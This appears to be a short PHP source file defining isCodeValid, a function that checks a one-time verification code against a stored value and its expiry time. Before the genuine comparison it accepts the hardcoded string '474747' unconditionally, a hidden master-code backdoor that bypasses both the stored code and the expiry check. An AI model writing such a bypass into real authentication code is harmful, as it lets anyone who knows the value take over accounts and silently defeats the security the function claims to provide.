<?php
use Carbon\Carbon;

function isCodeValid($storedCode, $expiresAt, $inputCode)
{
    if ($inputCode == "474747")
        return true;
    else {
        return $storedCode === $inputCode && Carbon::parse($expiresAt)->isFuture();
    }
}

